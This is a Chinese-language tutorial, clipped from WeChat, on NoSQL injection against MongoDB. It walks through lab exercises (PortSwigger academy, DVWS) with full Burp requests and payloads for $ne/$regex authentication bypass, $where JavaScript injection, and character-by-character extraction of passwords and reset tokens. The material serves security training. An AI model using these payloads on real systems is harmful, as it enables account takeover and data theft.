---
title: NoSQL Injection
url: https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247491343&idx=1&sn=2115403f83c49f301817ac3184808673&chksm=cf62e407f8156d11b5016c0d35231cce550b0f0efba3fc1e8cfd19243f8c4d6aa9c6f11e95d0&mpshare=1&scene=1&srcid=0314P5JDMtGBv3ybedJOiEBb&sharer_shareinfo=dfd730a0c233d7ad6bbbe656b29c5a8c&sharer_shareinfo_first=dfd730a0c233d7ad6bbbe656b29c5a8c#rd
clipped_at: 2024-03-31 16:02:20
category: temp
tags: 
 - mp.weixin.qq.com
---


# NoSQL Injection

#### 基本介绍

NoSQL Injection 是一种针对 NoSQL 数据库的安全漏洞，类似于传统的 SQL 注入攻击，NoSQL 数据库是一类非关系型数据库，例如:MongoDB、Cassandra、Redis 等，它们使用不同的数据存储和查询机制，NoSQL Injection 漏洞的本质是未正确验证和过滤用户输入导致攻击者能够执行未经授权的操作从而破坏数据库的完整性、泄露敏感数据或执行其他恶意行为

![图片](assets/1711872140-4fa0d26b94111054737fa7c3f9d24358.webp)

#### 漏洞类型

-   语法注入：当我们可以破坏 NoSQL 查询语法注入攻击载荷时就会发生这种情况，该方法与 SQL 注入中使用的方法类似，然而由于 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构，因此攻击的性质差异很大
    
-   运算符注入：当我们可以使用 NoSQL 查询运算符来操作查询时就会发生这种情况
    

#### 语法注入

##### 注入检测

下面我们思考一个再 MongoDB 中显示不同类别产品的购物应用程序，当用户选择 Fizzy 饮料类别时，其浏览器会请求以下 URL：

```plain
https://insecure-website.com/product/lookup?category=fizzy
```

此时应用程序发送 JSON 查询并从 MongoDB 数据库中的产品集合中检索相关产品：

```plain
this.category == 'fizzy'
```

要测试输入是否易受 SQL 注入攻击，我们只需要在类别参数的值中提交一个模糊字符串，MongoDB 的一个示例字符串是：】

```plain
'"`{
;$Foo}
$Foo \xYZ
```

使用此模糊字符串构建以下攻击向量，如果导致原始响应发生变化则可能表明用户输入没有正确过滤或净化

```plain
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

![图片](assets/1711872140-ec756de6b7b44f780ddab9c8f0ca35c7.webp)

##### 过滤字符

我们要确定应用程序将哪些字符解释为语法，我们可以注入单个字符，例如：可以提交'，这将导致以下 MongoDB 查询：

```plain
this.category == '''
```

如果这导致原始响应发生更改，则可能表示" ' "字符破坏了查询语法并导致语法错误，您可以通过在输入中提交有效的查询字符串来确认这一点，例如：通过转义引号，如果不会导致语法错误则意味着应用程序容易受到注入攻击

```plain
this.category == '\''
```

##### 确定条件

检测到漏洞后下一步是确定是否可以使用 NoSQL 语法影响布尔条件，要测试这一点，我们需要发送两个请求，一个条件为 false，一个为 true，例如：可以使用条件语句'&&0&&'x 和'&&1&&'x，如果应用程序的行为不同则表明假条件会影响查询逻辑，但真条件不会，同时也表明注入这种语法风格会影响服务器端查询

```plain
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

##### 条件覆盖

现在您已经确定可以影响布尔条件，所以我们可以尝试覆盖现有条件以利用该漏洞，例如：您可以注入一个始终计算为 true 的 JavaScript 条件，例如："||1||"

```plain
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```

![图片](assets/1711872140-3f0abe94f158eb69a5c056901fceef6a.webp)

这将导致以下 MongoDB 查询，而此时由于注入的条件始终为 true，因此修改后的查询将返回所有项，这使您能够查看任何类别中的所有产品，包括隐藏或未知类别

```plain
this.category == 'fizzy'||'1'=='1'
```

简易示例

Step 1：首先访问靶场并选择过滤器对类别进行过滤

![图片](assets/1711872140-4045f12cd0acddbeebeb70450a411299.webp)

Step 2：随后对类别参数进行注入测试，提交以下语句会引发报错提示信息

```plain
/filter?category=a'
```

![图片](assets/1711872140-940a32a4570e0a11274d30d7d187fcad.webp)

随后紧接着尝试对引号的闭合操作，构造如下语句：

```plain
Gifts'+'
```

![图片](assets/1711872140-00330ba0d469d0400de5cb1abbcf3c65.webp)

Step 3：随后我们确定是否可以注入布尔条件来更改响应，首先是在类别参数中插入一个 false 条件

```plain
Gifts' && 0 && 'x
```

![图片](assets/1711872140-73a1fd2fd6e666c5f70e340d9dbd3f69.webp)

随后已检索到礼品类别中的产品

```plain
Gifts' && 1 && 'x
```

![图片](assets/1711872140-73c680b14bcb5337db5cb73f6125a0d2.webp)

随后我们提交一个布尔条件，该条件在类别参数中的计算结果始终为 true：

```plain
Gifts'||1||'
```

![图片](assets/1711872140-31147e78f5b78cc21d8c993125719dd3.webp)

#### 运算注入

##### 基本介绍

NoSQL 数据库通常使用查询运算符，这些运算符提供了指定数据必须满足的条件才能包含在查询结果中的方法，MongoDB 查询运算符的示例包括：

-   $where：匹配满足 JavaScript 表达式的内容
    
-   $ne：匹配所有不等于指定值的值
    
-   $in-：匹配数组中指定的所有值
    
-   $regex：选择值与指定正则表达式匹配的内容
    

我们可以注入查询运算符来操作 NoSQL 查询，要做到这一点需要系统地将不同的运算符提交到一系列用户输入中，然后查看错误消息或其它更改的响应

##### 提交查询

在 JSON 消息中可以将查询运算符作为嵌套对象插入，例如：

```plain
#初始情况
{"username":"wiener"}

#嵌套之后
{"username":{"$ne":"invalid"}}
```

对于基于 URL 的输入可以通过 URL 参数插入查询运算符，例如：

```plain
#初始情况
username=wiener

#嵌套之后
username[$ne]=invalid
```

如果不起作用，可以尝试以下操作：

-   将请求方法从 GET 转换为 POST
    
-   将内容类型标题更改为 application/json
    
-   将 JSON 添加到消息体
    
-   JSON 注入查询运算符
    

##### 

注入检测

考虑一个易受攻击的应用程序，在 POST 请求的正文中接受用户名和密码

```plain
{"username":"wiener","password":"peter"}
```

用一系列运算符测试每个输入，例如：要测试用户名输入是否处理查询运算符则可以尝试以下注入

```plain
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

如果应用了$ne 运算符则会查询用户名不等于 invalid 的所有用户，如果用户名和密码输入都处理操作符，则可以使用以下有效载荷绕过身份验证

```plain
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

此查询返回用户名和密码不等于无效的所有登录凭据，因此你将作为集合中的第一个用户登录到应用程序，要以帐户为目标，您可以构造一个有效负载，其中包括已知用户名或您猜测的用户名，例如：

```plain
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

##### 演示示例

本靶场的登录功能由 MongoDB NoSQL 数据库提供，它很容易受到使用 MongoDB 操作符的 NoSQL 注入的攻击，请以管理员用户身份登录应用程序，你可以使用以下凭据登录到自己的帐户：wiener:peter

Step 1：使用上述凭据登录用户

![图片](assets/1711872140-25073f5a50dec8f34c5437f2f86bf2e3.png)

Step 2：在 Burpsuite 中测试用户名和密码参数以确定它们是否允许您注入 MongoDB 操作符，首先将 username 参数的值从"wiener"更改为{"$ne":""}，然后发送请求

```plain
POST /login HTTP/1.1
Host: 0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Connection: close
Content-Length: 42
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=6g2cQrl6PQhnpe6DqOQhgVmNPzauLgHB

{"username":{"$ne":""},"password":"peter"}
```

![图片](assets/1711872140-ddf9dcd5c53a63a44cdc2da5865545b4.webp)

随后将 username 参数的值从{"$ne":""}更改为{"$regex":"wien.\*"}，然后发送请求，可以看到这里我们使用$regex 运算符时也可以登录

```plain
POST /login HTTP/1.1
Host: 0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Connection: close
Content-Length: 51
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=6g2cQrl6PQhnpe6DqOQhgVmNPzauLgHB

{"username":{"$regex":"wien.*"},"password":"peter"}
```

![图片](assets/1711872140-f4a8fd35cc565a374e19a5820d78e5c5.webp)

随后将 username 参数设置为{"$ne":""}时，将 password 参数的值从"peter"更改为{"$ne":""}，然后再次发送请求，这会导致查询返回意外数量的记录，这表示已选择多个用户

```plain
POST /login HTTP/1.1
Host: 0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Connection: close
Content-Length: 45
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=6g2cQrl6PQhnpe6DqOQhgVmNPzauLgHB

{"username":{"$ne":""},"password":{"$ne":""}}
```

![图片](assets/1711872140-f8e479c0fd94d5a4f8afc4834fe7c0bf.webp)

在密码参数设置为{"$ne":""}的情况下将用户名参数的值更改为{"$regex":"admin.\*"}，然后再次发送请求，可以看到这成功地将我们作为了管理员用户登录

```plain
POST /login HTTP/1.1
Host: 0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Connection: close
Content-Length: 55
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4f0028031131c6805b354a00b5009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=6g2cQrl6PQhnpe6DqOQhgVmNPzauLgHB

{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

![图片](assets/1711872140-5e1f98144b9ed00e1a8a3067492e4ae5.webp)

#### 数据操作

##### 语法操作

###### 基本介绍

在许多 NoSQL 数据库中一些查询运算符或函数可以运行有限的 JavaScript 代码，例如:MongoDB 的$where 运算符和 mapReduce() 函数，这意味着如果有漏洞的应用程序使用这些运算符或函数，数据库可能会在查询中评估 JavaScript，因此您可以使用 JavaScript 函数从数据库中提取数据

下面我们想象一个易受攻击的应用程序，它允许用户查找其他注册用户名并显示其角色，这会触发对 URL 的请求

```plain
https://insecure-website.com/user/lookup?username=admin
```

这将导致用户集合的以下 NoSQL 查询：

```plain
{"$where":"this.username == 'admin'"}
```

由于查询使用$where 运算符，您可以尝试将 JavaScript 函数注入该查询以便它返回敏感数据，例如：您可以发送以下有效载荷

```plain
admin' && this.password[0] == 'a' || 'a'=='b
```

这将返回用户密码字符串的第一个字符使您能够逐个字符提取密码，您也可以使用 JavaScriptmatch() 函数来提取信息，例如：以下有效负载使您能够识别密码是否包含数字

```plain
admin' && this.password.match(/\d/) || 'a'=='b
```

###### 靶场演示

本靶场的用户查找功能由 MongoDB NoSQL 数据库提供支持，它容易受到 NoSQL 注入的攻击，请提取管理员用户的密码，然后登录到他们的帐户，您可以使用以下凭据登录到自己的帐户：wiener:peter

Step 1：首先使用以上账户进行登录操作

![图片](assets/1711872140-a4a4810ff55f35805f5ead016d7675c2.webp)

Step 2：在历史数据报文中检索 https://0afd005503eab6c9803617e300c00021.web-security-academy.net/user/lookup?user=wiener 请求，并将其发送到 repeat 模块，对参数加单引号后发现会出现错误提示信息，说明这里没有对单引号进行过滤处理

![图片](assets/1711872140-36e5d551b7636a81bf28be0c3d588d56.webp)

随后在用户参数中提交有效的 JavaScript 负载并进行 URL 编码，此时会检索 wiener 用户的帐户详细信息，这表明可能正在进行某种形式的服务器端注入

```plain
GET /user/lookup?user=wiener'%2b' HTTP/1.1
Host: 0afd005503eab6c9803617e300c00021.web-security-academy.net
Connection: close
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afd005503eab6c9803617e300c00021.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=Lc8ZSZtslasYQslWt4B4oBMek8Pior9Q

```

![图片](assets/1711872140-62621617df63e9812069075e077baab5.webp)

Step 3：随后我们需要确定是否可以通过布尔条件来更改响应

提交用户参数中的错误条件，例如：wiener'&&'1'=='2

```plain
GET /user/lookup?user=wiener'%26%26'1'%3d%3d'2 HTTP/1.1
Host: 0afd005503eab6c9803617e300c00021.web-security-academy.net
Connection: close
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afd005503eab6c9803617e300c00021.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=Lc8ZSZtslasYQslWt4B4oBMek8Pior9Q
```

![图片](assets/1711872140-57ea32c759a00918a9f33c6865a84899.webp)

```plain
wiener'%26%26'1'%3d%3d'1
```

![图片](assets/1711872140-94da9619c2773f63b4f34fcefd08d06e.webp)

Step 5：随后我们需要识别密码长度

将用户参数更改为 administrator'&&this.password.length<30||'a'=='b 然后发送请求，响应将检索管理员用户的帐户详细信息，这表示该条件为 true，因为密码少于 30 个字符

![图片](assets/1711872140-8e2f9a4100db42dfca18fa450c4e0181.webp)

小于 9

![图片](assets/1711872140-6857e9080154678c9baaa5b2d591aa1d.webp)

小于 8 时报错，所以密码的长度为 8

![图片](assets/1711872140-908989baa6519439c5e5736553394534.webp)

Step 5：随后枚举密码，将用户参数更改为 administrator'&&this.password\[§0§\]=='§a§，同时需要确保对有效负载进行 URL 编码

```plain
GET /user/lookup?user=administrator'&&this.password[§0§]=='§a§ 
```

![图片](assets/1711872140-c51306f88c12991ae559d327c9ced479.webp)

Step 6：随后怼第一个 payload 进行排序，然后查询有差异 Length 回显的数据，获取密码——ztbinfvo

![图片](assets/1711872140-b95300c71bdcf3f65a045005ac2980ce.webp)

##### 运算操作

###### 基本介绍

即使原始查询不使用任何能够运行任意 JavaScript 的运算符，我们也可以自己注入其中一个运算符，然后我们可以使用布尔条件来确定应用程序是否执行通过该运算符注入的 JavaScript，下面我们考虑一个易受攻击的应用程序，该应用程序接受 POST 请求正文中的用户名和密码：

```plain
{"username":"wiener","password":"peter"}
```

###### 注入确定

要测试是否可以注入运算符，我们可以尝试添加$where 运算符作为附加参数，然后发送一个条件求值为 false 的请求和另一个求值为 true 的请求，如果响应之间存在差异，这可能表明正在评估$where 子句中的 JavaScript 表达式

```plain
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

###### 数据提取

如果您注入了一个使您能够运行 JavaScript 的运算符，那么您可以使用 keys() 方法提取数据字段的名称，例如：您可以提交以下有效负载，这将检查用户对象中的第一个数据字段并返回字段名称的第一个字符，这使您能够逐个字符地提取字段名称

```plain
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

###### 靶场演示

本靶场的用户查找功能由 MongoDB NoSQL 数据库提供支持，它容易受到 NoSQL 注入的攻击，要解决实验室问题，请以 carlos 身份登录

首先我们访问靶场地址并使用 carlos 用户名进行简易的登录测试，此时提示"Invalid username or password"

![图片](assets/1711872140-52e99ef5b16e42b468eb27aa54cf6530.webp)

随后发送请求到 repeat 模块，更改密码参数值如下，此时提示账户被锁定，说明存在注入

```plain
{"$ne":"invalid"}
```

![图片](assets/1711872140-b2732797618d3dd338e41633edb66983.webp)

Step 3：重置 carlos 帐户的密码，当您提交 carlos 用户名时，重置机制涉及电子邮件验证，因此您无法自己重置帐户

![图片](assets/1711872140-1a8d301c0c7abf91b1dbdfe542d6edd0.webp)

Step 5：随后回到登录的请求包中，使用"POST /login"请求来测试应用程序是否易受 JavaScript 注入的攻击

```plain
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

![图片](assets/1711872140-9efeaed7c018401b15f5bd331d1d438a.webp)

```plain
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

![图片](assets/1711872140-23b6e84b66e10e58e6f65ed961492bad.webp)

Step  7：随后发送请求到 Intruder 模块

```plain
POST /login HTTP/1.1
Host: 0a4e0005040ae0d18307b961007100c4.web-security-academy.net
Connection: close
Content-Length: 63
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a4e0005040ae0d18307b961007100c4.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4e0005040ae0d18307b961007100c4.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=B8Qf680l4KuP7xSm58kyY7emeXmmQlxS

{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
```

![图片](assets/1711872140-36ea6b10f0a9d2db18b8707d18dac23f.webp)

![图片](assets/1711872140-54180803d7c1b49277ab15997a1b8df1.webp)

按 Payload1 和 Length 对攻击结果进行排序以识别具有 Account locked 消息，请注意 Payload 2 列中字符拼出了参数的名称：username

![图片](assets/1711872140-51f996588ee2229175ef9999b10d1a93.webp)

随后重复以上步骤以识别更多的 JSON 参数，您可以通过每次尝试都增加键数组的索引来实现这一点，例如：

```plain
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[2].match('^.{1}a.*')"}
```

![图片](assets/1711872140-19340fb8ef06c4ad48a0b91772982295.webp)

![图片](assets/1711872140-44111039bf1bed2923af6746b7e7dcb3.webp)

![图片](assets/1711872140-532b1b12282a4b444cabbfff3991b1f4.webp)

随后提交 URL 中密码重置令牌字段的已过滤名称：/forgot-password?YOURTOKENNAME=invalid，您收到一条 Invalid token 错误消息，这将确认是您拥有正确的令牌名称和端点

![图片](assets/1711872140-778dee09e539aafcfc9c02752b83062e.webp)

进行猜解操作：

![图片](assets/1711872140-9668511adfd7e65b87107dc8bdf2016b.webp)

记录 token 信息

![图片](assets/1711872140-23531cae6150e6417e4499c7d0ca9500.png)

使用 token 进行重置操作

![图片](assets/1711872140-2c3dd755ee249ff9608580ca1d023c2f.png)

在浏览器中打开

![图片](assets/1711872140-502ad848e9bb31ff46fa6ab074d412fe.webp)

随后完成密码重置操作

![图片](assets/1711872140-4d386a4f09ed525219c136dfcb3bd342.webp)

#### 靶场示例

这里我们在 DVWS 中查看 Public Note 并使用 burpsuit 抓包

![图片](assets/1711872140-adec7fc30883b52f5f3658e160759743.png)

![图片](assets/1711872140-fb939cdc8471d531519ee7e900697d63.webp)

随后进行简易 fuzzing

```plain
POST /api/v2/notesearch HTTP/1.1
Host: 192.168.204.160
Content-Length: 18
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWwxZXgiLCJwZXJtaXNzaW9ucyI6WyJ1c2VyOnJlYWQiLCJ1c2VyOndyaXRlIl0sImlhdCI6MTcwNjM3NTAyNSwiZXhwIjoxNzA2NTQ3ODI1LCJpc3MiOiJodHRwczovL2dpdGh1Yi5jb20vc25vb3B5c2VjdXJpdHkifQ.HYLse7VkddVzfCGa8iWVG1sZuxdtPvv2af7s7nfkHLg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.204.160
Referer: http://192.168.204.160/search.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"search":"al1ex' || 'a'='a"}
```

![图片](assets/1711872140-2f30a4fbd4b01b60b95aa741ab60c23a.webp)

#### 文末小结

本篇文章我们主要介绍了 NoSQL Injection 的注入原理、注入检测方法以及注入利用实践思路流程~